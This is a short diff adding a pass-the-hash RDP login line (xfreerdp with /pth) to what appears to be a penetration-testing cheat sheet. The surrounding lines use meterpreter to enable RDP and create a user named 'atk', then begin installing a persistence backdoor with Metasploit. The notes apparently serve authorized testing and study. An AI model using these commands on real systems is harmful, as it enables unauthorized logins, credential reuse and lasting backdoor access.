@@ -38,6 +38,10 @@ meterpreter > run -e -u atk -p atk # enable rdp and create new user.
 # check again.
 xfreerdp /v:192.168.0.11 /u:atk /p:atk # login with RDP.
 
+# Pass the NTLM hash attack using xfreerdp
+# if we obtain the NTLM hash, we can use it to login RDP using xfreerdp:
+xfreerdp /u:admin /d:domain_name /pth:<ntlm_hash> /v:$ip
+
 # 4th
 # installing a Backdoor on the target.
 msf > use exploit/windows/local/persistence
